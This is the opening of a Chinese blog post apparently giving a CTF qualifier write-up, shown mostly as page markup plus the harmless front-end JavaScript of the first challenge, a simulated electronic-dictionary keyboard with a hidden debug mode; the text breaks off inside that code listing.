<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/upload/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/upload/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/upload/favicon-16x16.png">
  <link rel="mask-icon" href="/upload/kaoruko.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="京津冀长城杯初赛wp(复现)">
<meta property="og:type" content="article">
<meta property="og:title" content="京津冀长城杯初赛wp">
<meta property="og:url" content="https://hllttz.github.io/2025/09/17/%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/index.html">
<meta property="og:site_name" content="hllttz&#39;s blog">
<meta property="og:description" content="京津冀长城杯初赛wp(复现)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250914102036401.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250914102125166.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250914102237341.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250914103038978.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250914115500418.png">
<meta property="og:image" content="https://hllttz.github.io/images/640.webp">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250914130549647.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250917191955949.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250917194610455.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250917194716694.png">
<meta property="og:image" content="https://hllttz.github.io/images/640-1758109734632-3.webp">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250917195249711.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250917195324051.png">
<meta property="og:image" content="https://hllttz.github.io/images/image-20250917195404191.png">
<meta property="article:published_time" content="2025-09-17T11:05:21.000Z">
<meta property="article:modified_time" content="2025-09-17T12:16:52.604Z">
<meta property="article:author" content="hllttz">
<meta property="article:tag" content="ccb wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hllttz.github.io/images/image-20250914102036401.png">


<link rel="canonical" href="https://hllttz.github.io/2025/09/17/%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hllttz.github.io/2025/09/17/%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/","path":"2025/09/17/京津冀长城杯初赛wp/","title":"京津冀长城杯初赛wp"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>京津冀长城杯初赛wp | hllttz's blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">hllttz's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%AC%E6%B4%A5%E5%86%80ccb"><span class="nav-number">1.</span> <span class="nav-text">京津冀ccb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E6%9B%B2%E7%AD%BE%E5%AD%A6"><span class="nav-number">1.1.</span> <span class="nav-text">文曲签学</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SeRce"><span class="nav-number">1.2.</span> <span class="nav-text">SeRce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZ-upload"><span class="nav-number">1.3.</span> <span class="nav-text">EZ_upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RealChekIn-1"><span class="nav-number">1.4.</span> <span class="nav-text">RealChekIn-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AI-easy-posion"><span class="nav-number">1.5.</span> <span class="nav-text">AI easy_posion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AI-Mini-modelscope"><span class="nav-number">1.6.</span> <span class="nav-text">AI Mini-modelscope</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AI-eztalk"><span class="nav-number">1.7.</span> <span class="nav-text">AI eztalk</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">hllttz</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hllttz.github.io/2025/09/17/%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hllttz">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hllttz's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="京津冀长城杯初赛wp | hllttz's blog">
      <meta itemprop="description" content="京津冀长城杯初赛wp(复现)">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          京津冀长城杯初赛wp
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-09-17 19:05:21 / 修改时间：20:16:52" itemprop="dateCreated datePublished" datetime="2025-09-17T19:05:21+08:00">2025-09-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>37k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>34 分钟</span>
    </span>
</div>

            <div class="post-description">京津冀长城杯初赛wp(复现)</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="京津冀ccb"><a href="#京津冀ccb" class="headerlink" title="京津冀ccb"></a>京津冀ccb</h1><h2 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h2><p>f12得到逻辑代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fnKey = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fnKey&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> capsKey = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;capsKey&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> searchKey = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchKey&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> clearKey = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;clearKey&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> inputBox = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;inputBox&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> screenContent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;screenContent&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> debugHint = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;debugHint&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> capsHint = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;capsHint&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> keys = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.key&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> menuKey = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;menuKey&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> backKey = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;backKey&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 状态变量</span></span><br><span class="line"><span class="keyword">let</span> debugMode = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> isUpperCase = <span class="literal">true</span>; <span class="comment">// 默认大写</span></span><br><span class="line"><span class="keyword">let</span> fnPressTimer = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FN_HOLD_DURATION</span> = <span class="number">1500</span>; <span class="comment">// 长按Fn键激活调试模式的时间(毫秒)</span></span><br><span class="line"><span class="keyword">let</span> isMenuActive = <span class="literal">false</span>; <span class="comment">// 菜单激活状态（true=处于菜单选择中，false=普通输入）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Fn键长按激活调试模式</span></span><br><span class="line">fnKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    fnPressTimer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        debugMode = !debugMode;</span><br><span class="line">        <span class="keyword">if</span> (debugMode) &#123;</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[调试模式已激活]&quot;</span>, <span class="string">&quot;text-yellow-300&quot;</span>);</span><br><span class="line">            debugHint.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[调试模式已关闭]&quot;</span>, <span class="string">&quot;text-red-400&quot;</span>);</span><br><span class="line">            debugHint.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="variable constant_">FN_HOLD_DURATION</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">fnKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseup&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">clearTimeout</span>(fnPressTimer);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">fnKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">clearTimeout</span>(fnPressTimer);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小写切换功能</span></span><br><span class="line">capsKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>), <span class="number">100</span>);</span><br><span class="line">    </span><br><span class="line">    isUpperCase = !isUpperCase;</span><br><span class="line">    <span class="keyword">if</span> (isUpperCase) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;caps-active&#x27;</span>);</span><br><span class="line">        capsHint.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[大写模式]&quot;</span>, <span class="string">&quot;text-red-400&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;caps-active&#x27;</span>);</span><br><span class="line">        capsHint.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[小写模式]&quot;</span>, <span class="string">&quot;text-green-400&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字母键点击事件（核心：菜单状态下A/B/C触发选择，其他键正常输入）</span></span><br><span class="line">keys.<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    key.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>), <span class="number">100</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> keyChar = <span class="variable language_">this</span>.<span class="property">textContent</span>; <span class="comment">// 获取当前按键的字符（A/B/C/其他）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 菜单激活状态：优先处理A/B/C选择</span></span><br><span class="line">        <span class="keyword">if</span> (isMenuActive) &#123;</span><br><span class="line">            <span class="keyword">if</span> ([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>].<span class="title function_">includes</span>(keyChar)) &#123;</span><br><span class="line">                <span class="title function_">handleMenuSelection</span>(keyChar); <span class="comment">// 触发菜单选择逻辑</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 非A/B/C键提示无效</span></span><br><span class="line">                <span class="title function_">addScreenMessage</span>(<span class="string">`[无效选择] 请按A/B/C`</span>, <span class="string">&quot;text-red-400&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">// 菜单状态下不执行普通输入</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 普通输入状态：处理所有字母键输入</span></span><br><span class="line">        <span class="keyword">let</span> inputChar = keyChar;</span><br><span class="line">        <span class="comment">// 根据大小写模式转换字符（#号不转换）</span></span><br><span class="line">        <span class="keyword">if</span> (!isUpperCase &amp;&amp; keyChar !== <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">            inputChar = inputChar.<span class="title function_">toLowerCase</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        inputBox.<span class="property">value</span> += inputChar;</span><br><span class="line">        inputBox.<span class="title function_">focus</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 菜单键功能（更新菜单选项为A/B/C）</span></span><br><span class="line">menuKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>), <span class="number">100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 切换菜单状态</span></span><br><span class="line">    <span class="keyword">if</span> (!isMenuActive) &#123;</span><br><span class="line">        isMenuActive = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[菜单已激活]&quot;</span>);</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;A. 天气&quot;</span>); <span class="comment">// A对应查词</span></span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;B. 游戏&quot;</span>); <span class="comment">// B对应游戏</span></span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;C. 设置&quot;</span>); <span class="comment">// C对应设置</span></span><br><span class="line">        inputBox.<span class="property">value</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 清空输入框，避免干扰</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        isMenuActive = <span class="literal">false</span>;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[菜单已关闭]&quot;</span>);</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;返回普通输入模式&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心：处理菜单选择（A/B/C对应不同功能回显）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleMenuSelection</span>(<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span>(key) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;A&quot;</span>:</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;&gt; A&quot;</span>); <span class="comment">// 回显选择的按键</span></span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;今天天气很好，记得继续保持好心情呀～&quot;</span>);</span><br><span class="line">            isMenuActive = <span class="literal">false</span>; <span class="comment">// 选择后自动退出菜单，允许输入单词</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;&gt; B&quot;</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;『英雄坛说』加载中...&quot;</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;（抱歉呀，你手里这台98年产的文曲星，还停留在按键敲出清脆声响的年代，2007年的游戏，它还不认识呢～）&quot;</span>);</span><br><span class="line">            isMenuActive = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;C&quot;</span>:</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;&gt; C&quot;</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;当前配置：&quot;</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;  